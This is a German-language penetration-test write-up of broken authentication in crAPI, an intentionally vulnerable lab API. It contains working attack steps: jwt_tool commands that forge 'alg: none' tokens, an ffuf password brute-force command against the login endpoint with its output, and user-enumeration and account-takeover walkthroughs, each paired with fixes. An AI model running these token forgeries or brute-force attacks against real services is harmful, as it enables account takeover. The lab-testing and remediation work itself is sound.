# Broken Authentication
# TL:DR
Kritische Befunde:
- Lang gültige JWTs (7 Tage) ohne Möglichkeit zur serverseitigen Invalidierung → gestohlene Tokens bleiben voll nutzbar.
- JWT-Signatur-Bypass ("alg: none") möglich → API akzeptiert unsignierte Token und ignoriert abgelaufene exp-Werte.
- Kein Account-Lockout, kein echtes Rate-Limiting → Brute-Force-Angriffe gegen Logins jederzeit möglich.
- User Enumeration über Fehlermeldungen → Identifikation registrierter E-Mails möglich.
- Keine serverseitigen Passwortregeln → API akzeptiert triviale, schwache Passwörter trotz UI-Validierung.
- Sämtliche sensiblen Änderungen ohne Re-Auth (Passwort, E-Mail, Telefonnummer) → Bearer-Token allein reicht.
- Vollständiger Account Takeover durch einmal kompromittierten Token (Passwort ändern → E-Mail ändern → Phone ändern → Opfer ausgesperrt).
- Keine MFA, nur schwache 4-stellige OTPs ohne Rate-Limit → zusätzlicher Angriffsvektor.

**Kurzfazit:**
Ein einzelner kompromittierter JWT genügt für eine vollständige und irreversible Kontoübernahme. Die Kombination aus Signatur-Bypass, fehlender Token-Invalidierung, fehlender Re-Auth und schwachen Schutzmechanismen macht die Anwendung hochgradig angreifbar.

**API2:2023 – Broken Authentication** betrifft alle Fehler, bei denen sich ein Angreifer unberechtigt authentifizieren, fremde Accounts übernehmen 
oder Tokens missbrauchen kann. Dazu zählen fehlerhafte Login-Mechanismen, unsichere Passwort- oder Token-Verwaltung sowie unzureichende 
Schutzmaßnahmen gegen Brute-Force- oder Credential-Stuffing-Angriffe. Die Folge sind Kontoübernahmen, unautorisierte API-Aufrufe 
und ein umfassender Verlust der Zugriffskontrolle. 

# JWT- und Token-Verwaltung
## Auth in crAPI
crAPI verwendet als Authentifizierungsmethode einen JWT (Single Token) als Bearer Token in jeder Request um den Nutzer zu authentifizieren. 
Der Token wird bei jedem "frischen" Login generiert und dem User zugeteilt, der sich anmeldet. Mit [jwt.io](https://jwt.io) lassen sich JWTs dekodieren:
<img width="1840" height="992" alt="image" src="https://github.com/user-attachments/assets/36abaeb4-e95e-4e32-8e1a-f781178e9a55" />


Die JWTs sind mit RS256 signiert, enthalten role-Claims (z.B. user), die Login-Email sowie die Gültigkeitsdauer.

Die Gültigkeitsdauer ist in den JWTs im Unix-Zeitformat angegeben und lässt sich einfach zurückrechnen: 
- exp – iat = 1763979951 – 1763375151 = 604800 Sekunden = ~7 Tage

Dies stellt ein erhebliches Sicherheitsrisiko dar, da ein kompromittierter Token über die gesamte Laufzeit ungehinderten Zugriff ermöglicht. 
Wenn die API keine serverseitige Token-Invalidierung implementiert, kann ein Angreifer selbst nach einem Logout des Nutzers das Konto weiterhin vollständig missbrauchen.

## Token-Invalidierung
1. Um die API auf Token-Invalidierung zu prüfen logge ich mich über das UI ein und speichere den Token, den die API nach dem Einloggen          zurückgibt:
   <img width="920" height="772" alt="image" src="https://github.com/user-attachments/assets/a4faccb8-c202-42e3-9983-629c23868415" />
2. Anschließend ausloggen um die Token-Invalidierung auszulösen

3. Wenn die Token-Invalidierung korrekt implementiert ist, sollte die API Requests mit diesem Bearer Token nicht mehr akzeptieren und einen
   Code 401 Unauthorized zurückgeben:
   <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/481c21d7-8809-46fd-93ed-44bdde963b1c" />
Die API akzeptiert die Anfrage auch nach Abmelden des Users, was belegt, dass keine Token-Invalidierung implementiert wurde.

### Konsequenzen
Ein Angreifer, der den Token zuvor abgefangen hat (z. B. durch Logging, XSS, Proxy oder Sniffing), erhält mindestens bis zum 
Ablauf der Token-Lebenszeit (7 Tage!) vollständigen Zugriff auf das Konto des Opfers. Dabei gibt es keine Möglichkeit den Token zu widerrufen, selbst wenn der Vorfall bemerkt wurde.

### Fix
- Serverseitigen Token-Revocation-Mechanismus einführen (z.B. Blacklist, Session-Store, Session-Versioning)
- Token-Laufzeit auf 30-60 Minuten reduzieren
- Invalidation aller aktiven Tokens bei kritischen Aktionen wie Logout, Passwortänderung, MFA-Änderung etc.

## JWT-Downgrading Angriff (alg: none)
Beim Dekodieren der JWTs sieht man, dass die Bearer Token mit RS256 signiert werden. Ein typischer (wenn auch selten erfolgreicher) Angriff auf JWTs ist ein Downgrading Angriff bei dem der Signaturalgorithmus umgangen wird, indem der Signieralgorithmus im Token-Header von "RS256" auf schwache Signieralgorithmen gezwungen wird (z.B. symmetrische Algorithmen wie HS256, oder HMAC brute-force mit schwachem secret).

Mit einem Tool wie jwt_tool kann man den Token Header manipulieren, sodass anstatt des Headers "alg: RS265" der Header "alg: none" kodiert wird, was bei einer Schwachstelle den gesamten Signieralgorithmus bypasst und somit auch der Private-Key des Servers irrelevant wird.

Für diese Schwachstelle bietet jwt_tool ein eigenes Argument **-X a** um vier verschiedene Versionen vom "alg: none" Header (mit verschiedenen Schreibweisen von *none*) zu erstellen. Dazu wird dem Tool ein gültiger Token übergeben und das Argument **-X a** gesetzt:

```bash
python3 jwt_tool.py eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyQUBtYWlsLmNvbSIsImlhdCI6MTc2MzU1NjI4NCwiZXhwIjoxNzY0MTYxMDg0LCJyb2xlIjoidXNlciJ9.ON2HnfYWsdtmV5nd2wOMvWwoJ6-nfiJtPtFvfJyWYA6unk7Va8mKodp0d1QUtkaEMXMN7kBRW4sjNDcLFR2OplxZFvnEx_QqiMKGnuPlqm5aBMJDAl7KTalaH2mf7qU8pZPrkm_q6aRNjObL7yHzdgvya4yfmI6pazr6QMwlyhfBL0KQnukB-cizwctjspT3lELNzi2pLO2UqG2-EL1cprSP7oF_dC3DRh-eXJp2ogUMg58Qs97vooM3KbYh-voaksFXtQBqOCfnQ7fqQSrHQVh95USY73vELzUX6RSHmafRQbiuX8K-jJkTYUDxFY5Js-9HPQ-FUThSnP6kAysilg -X a
```
<img width="1017" height="941" alt="image" src="https://github.com/user-attachments/assets/a394bcd0-2d6a-405d-ab86-27c68a38fec7" />

Jetzt wird in Postman der manipuliert Token als Authentifizierung übergeben um auf ein Objekt zuzugreifen:

<img width="1841" height="958" alt="image" src="https://github.com/user-attachments/assets/747e4441-1980-41d8-9ac8-d5b2faf7081e" />

Da der Server diesen manipulierten Token akzeptiert ist bewiesen, dass die API eine Schwachstelle gegenüber Downgrading Angriffe aufweist.

### Analyse der gescheiterten horizontalen Eskalation
Obwohl der Server unsignierte Tokens akzeptiert und der Zugriff auf geschützte Ressourcen des aktuellen Benutzers möglich ist, schlug die horizontale Eskalation (der Versuch, die Identität auf einen anderen Benutzer, z.B. userB, zu fälschen) fehl.

Der Server lieferte stets die Daten des ursprünglichen Token-Besitzers (userA) zurück, selbst nachdem der sub Claim manipuliert wurde. Dies deutet auf eine inkonsistente Validierungslogik hin:

- Die API vertraut den sekundären Payload-Claims (die nicht zur Identität gehören) und führt die angeforderte Funktion aus.
- Die API ignoriert jedoch den manipulierten sub Claim und identifiziert den Benutzer über einen versteckten Mechanismus (z.B. einen unsichtbaren jti Claim oder einen Hash des Original-Tokens), der nicht manipuliert wurde und weiterhin auf User A verweist.

Das bedeutet, dass die API zwar kritisch anfällig für den Signatur-Bypass ist, die horizontale Rechteausweitung jedoch aufgrund eines unbekannten Identifikators verhindert wird. Für eine horizontale Rechteausweitung ist also nicht nur die Email und der Username nötig sondern ein (für mich aktuell) obufszierter ID-Mechanismus.

### Token-Expiry-Handling
Dass man den Signieralgorithmus bypassen kann ermöglicht es, das Token-Expiry-Handling des Servers auch ohne private key zu testen.

Vorgehen:
1. "alg:" Header eines gültigen keys manipulieren:
```bash
   python3 jwt_tool.py  eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyQUBtYWlsLmNvbSIsImlhdCI6MTc2MzU2NDIxNiwiZXhwIjoxNzY0MTY5MDE2LCJyb2xlIjoidXNlciJ9.mbY_ud0k4W6I5v35zFKhQYxKrxUC1vKoYiBhQch3BVeorUUmg3IkCm5xXIBEJOrVhCoCm-R2iKHdVE1SiLrZECYGOLnXTXF0lHR3jfdAKwkZ7xqGdZnyBKQJYFnYiP7jJfjlLEV6-Z0fxLxMjh-Vba6MdgsBr3gnqMBxuIPlkSvt2kWBkft_Ilwrbp6YszBtlqdwUVs6fwVsKZ_Lt7tXEz6hvvVyFKBf-Yeq84hMH5PSWZUHiLYbFZ8UMeFDjhFjw5GwfZD_6PU1r5T_9phoj84ZHZ84sMctR8C_rHmV7flJAjApRUG30NmBxpR-ps5YW6cHy5wVA4M-naqDm7LPzw -X a
```
**Output**: eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyQUBtYWlsLmNvbSIsImlhdCI6MTc2MzU2NDIxNiwiZXhwIjoxNzY0MTY5MDE2LCJyb2xlIjoidXNlciJ9.

2. Mit *-T* das den "exp"-Wert in die Vergangenheit setzen und Token speichern:
```bash  
[1] sub = "userA@mail.com"
[2] iat = 1762959416    ==> TIMESTAMP = 2025-11-12 15:56:56 (UTC)
[3] exp = 1763564216    ==> TIMESTAMP = 2025-11-19 15:56:56 (UTC)
[4] role = "user"
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
Signature unchanged - no signing method specified (-S or -X)
jwttool_d1e9ae0cf7d0f7c72b04cb03469f5ffa - Tampered token:
[+] eyJhbGciOiJub25lIn0.eyJzdWIiOiJ1c2VyQUBtYWlsLmNvbSIsImlhdCI6MTc2Mjk1OTQxNiwiZXhwIjoxNzYzNTY0MjE2LCJyb2xlIjoidXNlciJ9.
```
Dieser Token enthält nun die Information, dass kein Signieralgorithmus benutzt wird und am 19.11.2025 um 15:56:56 ungültig wird. 


3. Manipulierten Token als Authentifizierung verwenden:
<img width="1840" height="990" alt="image" src="https://github.com/user-attachments/assets/9c3bb735-4265-42a6-85fc-c1fa96f6978d" />

Der Server akzeptiert den Token und weist somit ein schwaches Token-Expiry-Handling auf. 

Dass die API manipulierte Token akzeptiert kann man ebenfalls nachweisen, indem man die Token vom Endpunkt */verify* validieren lässt:

<img width="1840" height="958" alt="image" src="https://github.com/user-attachments/assets/717448a5-3ca2-45e4-99fc-4a891ebb82fa" />

Die API ist kritisch anfällig für einen JWT-Signatur-Bypass (alg: none), der es einem Angreifer ermöglicht, beliebige Tokens ohne Signatur zu erstellen. Da die API die Gültigkeitsprüfung (exp-Claim) ignoriert, sobald das Token unsigniert ist, sind selbst Token, deren Ablaufdatum in der Vergangenheit liegt, dauerhaft gültig. Dies führt zu einer vollständigen Umgehung des Token-Lebenszyklus und des Ablaufs, da kompromittierte Tokens niemals ungültig werden. Von Angreifern kompromittierte Token sind demnach unbegrenzt gültig was ein enormes Sicherheitsrisiko darstellt.


# Login-Mechanismen und Schutz
Ein wichtiger Login-Mechanismus ist Rate-Limiting und Bruce-Force-Schutz bzw. Lockout.

Der Login-Endpunkt (POST /identity/api/auth/login) der API weist zwei Hauptmängel in der Implementierung des Kontoschutzes auf:

1. Fehlender Account Lockout (Brute-Force-Anfälligkeit)
Die API verhindert keine unbegrenzten Anmeldeversuche gegen ein einzelnes Benutzerkonto.

Es wurde ein Brute-Force-Angriff mit über 1000 fehlerhaften Passwörtern gegen das Konto userA@mail.com durchgeführt. Auch nach rund 1000 falsch geratenen Passwörtern wurde kein Rate Limiting getriggert oder ein Code 429 Too Many Requests zurückgegeben und der Login mit dem richtigen Passwort akzeptiert.

Verwendeter ffuf Befehl:

```bash

ffuf -w Pwdb_top-1000.txt:PASSWD \
     -X POST \
     -u http://crapi.local:8888/identity/api/v1/auth/login \
     -H "Content-Type: application/json" \
     -d '{"email": "userA@mail.com", "password": "PASSWD"}'
```

Letzten 10 Zeilen des Outputs:

```bash
pass1234                [Status: 401, Size: 76, Words: 2, Lines: 1, Duration: 6393ms]
brenda                  [Status: 401, Size: 76, Words: 2, Lines: 1, Duration: 7399ms]
rocket                  [Status: 401, Size: 76, Words: 2, Lines: 1, Duration: 6291ms]
debbie                  [Status: 401, Size: 76, Words: 2, Lines: 1, Duration: 6301ms]
camaro                  [Status: 401, Size: 76, Words: 2, Lines: 1, Duration: 7597ms]
Pw1234!                 [Status: 200, Size: 537, Words: 2, Lines: 1, Duration: 6405ms]
8675309                 [Status: 401, Size: 76, Words: 2, Lines: 1, Duration: 6591ms]
g13916055158            [Status: 401, Size: 76, Words: 2, Lines: 1, Duration: 6294ms]
cheyenne                [Status: 401, Size: 76, Words: 2, Lines: 1, Duration: 5094ms]
andreas                 [Status: 401, Size: 76, Words: 2, Lines: 1, Duration: 6192ms]
:: Progress: [1001/1001] :: Job [1/1] :: 2 req/sec :: Duration: [0:06:51] :: Errors: 665 ::
```
Alle Fehlversuche zeigten eine künstliche Antwortverzögerung (Response Delay) von ca. 6–8 Sekunden, was den Angreifer bremst, aber kein sicheren Brute-Force-Schutz darstellt und eine Kontoübernahme höchstens zeitlich verzögert.
Der korrekte Login-Versuch war erfolgreich (Status: 200) und beweist, dass kein Lockout-Mechanismus implementiert ist.

## Schlussfolgerung: 
Dies ermöglicht Brute-Force-Angriffe bis zum Erfolg und stellt ein hohes Risiko für die Kontoübernahme dar.

## Fix
- Account Lockout einführen: Implementierung einer festen Grenze für fehlgeschlagene Anmeldeversuche (z.B. 5 Versuche innerhalb von 15 Minuten). Konto zeitlich begrenzt- oder bis zur manuellen Freischaltung sperren bei Überschreitung.

- Rate Limiting verbessern: Verwenden eines Standard-HTTP-Statuscodes (429 Too Many Requests) zur Signalisierung der Ratenbegrenzung. Die künstliche Verzögerung ist ein guter Zusatz, ersetzt aber keinen harten Lockout.

- ReCAPTCHA/MFA: Implementierung eines CAPTCHA-Mechanismus nach 3-5 fehlgeschlagenen Versuchen, um automatisierte Angriffe zu erschweren, bevor der Lockout greift.


2. User-Enumeration

Bei der Benutzer-Aufzählung (User Enumeration) geht es darum, ob die API durch unterschiedliche Fehlermeldungen verrät, ob ein Benutzerkonto überhaupt in der Datenbank existiert.

Angenommen ein Angreifer besitzt eine Liste von Millionen gestohlener E-Mail-Adressen (z.B. aus Leaks), möchte er wissen, welche davon bei einer bestimmten API registriert sind.

Dabei können Fehlermeldungen der API Aufschluss darüber geben, ob eine Email Adresse überhaupt bei dieser API angemeldet ist:
- Unsichere API: "Passwort falsch" (Angreifer weiß: User existiert).
- Unsichere API: "Benutzer nicht gefunden" (Angreifer weiß: User existiert nicht).

Durch diese spezifischen Meldungen kann der Angreifer seine Liste auf die tatsächlichen Nutzer des Dienstes reduzieren und gezielte Brute-Force-Angriffe starten (Credential Stuffing).

Es wird mit folgenden Email/Passwort-Kombinationen getestet und die Antwort des Servers verglichen:
- Richtige Email + falsches Passwort
- Falsche Email + falsches Passwort

<img width="1367" height="845" alt="image" src="https://github.com/user-attachments/assets/17ffd64a-b2e5-4b31-9f99-9f30cb3f43f8" />
<img width="1367" height="845" alt="image" src="https://github.com/user-attachments/assets/c0a96eaf-608e-47d3-9618-6cf47dba86e8" />

Der Vergleich der Serverantworten für einen existierenden und einen nicht-existierenden Benutzernamen mit einem falschen Passwort zeigt, dass die API spezifische Informationen über die Existenz des Benutzers preisgibt.

- Test A (Existierender Benutzer): Bei einer registrierten E-Mail-Adresse (userA@mail.com) antwortet der Server mit 401 Unauthorized und der spezifischen Meldung "Invalid Credentials".

- Test B (Nicht-existierender Benutzer): Bei einer nicht-registrierten E-Mail-Adresse antwortet der Server ebenfalls mit 401 Unauthorized, jedoch mit der expliziten Meldung "Given Email is not registered!".

### Schlussfolgerung: 
Die unterschiedlichen Fehlermeldungen ermöglichen es einem Angreifer, die Datenbank der registrierten Benutzer vollständig aufzuzählen (User Enumeration), was die Vorbereitung von Credential-Stuffing-Angriffen massiv vereinfacht.

## Fix:
Der Server muss jede Form von Unterscheidung zwischen den Fehlern "Benutzer existiert nicht" und "Passwort ist falsch" eliminieren:

Statt:

- "Given Email is not registered!" (Existiert nicht)
- "Invalid Credentials" (Passwort falsch)

sollte die API immer die gleiche Meldung senden, zum Beispiel:
- "message": "Ungültige E-Mail-Adresse oder Passwort."

Außerdem muss das Antwort Delay des Servers auch greifen, wenn die Email nicht registriert ist, da sonst Side Channel Angriffe über die Antwortzeit des Servers möglich wären!


# Passwörter und sensitive Funktionen

## Schwache Passwörter
Auch wenn die Anwengung im UI beim Registrieren Anforderungen an das Passwort stellt, kann man in die Passwortanforderungen per API umgehen:
<br>
<img width="502" height="908" alt="image" src="https://github.com/user-attachments/assets/d098287f-5a1f-4b7f-a48d-bd041d44fddd" />
<img width="1361" height="792" alt="image" src="https://github.com/user-attachments/assets/60cb571d-df78-413f-8f0a-82fb4ffbeb10" />

Gleiches gilt für die Reset-Passwort-Funktion:
<br>
<img width="501" height="638" alt="image" src="https://github.com/user-attachments/assets/5be82491-7235-4055-9ebd-bbbbf8fa345c" />
<img width="1371" height="792" alt="image" src="https://github.com/user-attachments/assets/edf20025-c17a-4113-83df-cf6fdea32e7f" />

### Zusammenfassung
Die Anwendung stellt im User Interface (UI) korrekte Anforderungen an die Passwortkomplexität. Der Registrierungs- oder Passwortänderungs-Endpunkt der API prüft diese Regeln jedoch nicht auf Serverseite. Dies ermöglicht einem Angreifer, durch direkte POST-Requests an die API (/auth/signup oder /user/change-password) triviale, kurze oder häufig verwendete Passwörter zu setzen.

### Folge
Das Schutzniveau des gesamten Systems wird auf das niedrigste akzeptierte Passwort reduziert, was Brute-Force- und Credential-Stuffing-Angriffe gegen die Konten erleichtert.

### Fix
- Serverseitige Validierung einführen: Die API-Endpunkte müssen die gleichen strengen Passwortrichtlinien implementieren und strikt durchsetzen, die auch im UI verwendet werden.
- Input-Validierung: Alle Passwörter müssen vor der Hashing-Operation auf die Einhaltung der Komplexitätsregeln geprüft werden.


## Sensitive Funktionen
Dieser Abschnitt beschreibt, dass sensible Änderungen am Benutzerkonto – etwa das Aktualisieren der E-Mail-Adresse oder anderer sicherheitsrelevanter Daten – ohne erneute Passwortbestätigung möglich sind. Endpunkte wie /api/v2/user/change_email erzwingen keine zusätzliche Authentifizierung und öffnen damit Angriffsflächen, wenn ein gültiges Session-Token abgegriffen oder missbraucht wird.

### Multi-Faktor-Authentifizierung
crAPI implementiert keinerlei Form der Multi-Faktor-Authentifizierung, obwohl kritische Funktionen (Mailwechsel, Passwortänderung usw.) vorhanden sind. Dadurch fehlt eine wesentliche Schutzschicht gegen Kontoübernahmen und Session-Hijacking.

### Passwortänderung
Wie im letzten Abschnitt gezeigt verlangt die API zum Ändern des Passworts lediglich den Bearer Token des Users was nicht der Best Practice entspricht, da Angreifer Bearer Token vergleichsweise einfach durch Session-Hijacking oder XSS basierten Angriffen kompromittieren können und somit Kontrolle über den gesamten Account des Opfers bekommen.

### Email-Aktualisierung
Auch der */change-email* Email Endpunkt weist dieselbe Schwachstelle auf wie der Endpunkt zur Passwortänderung und erlaubt es einem Angreifer mit nur dem Bearer Token und der Email (welche man dem Bearer Token entnehmen kann) die Email des Accounts zu ändern und so sämtliche Sicherheitskritische Funktionen zu übernehmen.

### Change-Phone-Number
Der Endpunkt */change-phone-number* weist alleine keine Schwachstelle auf, da er die verknüpfte Email (und den Bearer Token) des Accounts benutzt, um ein OTP zu verschicken, welches bei dem Endpunkt */verify-phone-otp* validiert werden muss, bevor die Nummer geändert wird. Allerdings kann ein Angreifer mit dem Bearer Token vorher die Email des Accounts ändern, was die OTP-Verifizierung per Email vollständig umgeht. 

## Fazit
Mit einem einzigen gestohlenen Bearer-Token ist eine vollständige und irreversible Kontoübernahme möglich, da sowohl Passwort- als auch E-Mail- und Telefonnummer-Änderungen ohne erneute Authentifizierung oder zusätzliche Sicherheitsfaktoren durchgeführt werden können. Der legitime Nutzer kann sich danach weder anmelden noch das Konto wiederherstellen. Ebenfalls lassen sich theoretisch aufgrund von schwachen 4-stelligen OTPs und Abwesenheit von Rate Limiting diese OTPs brute-forcen, was allerdings nicht für eine vollständige Kontoübernahme ausreicht.

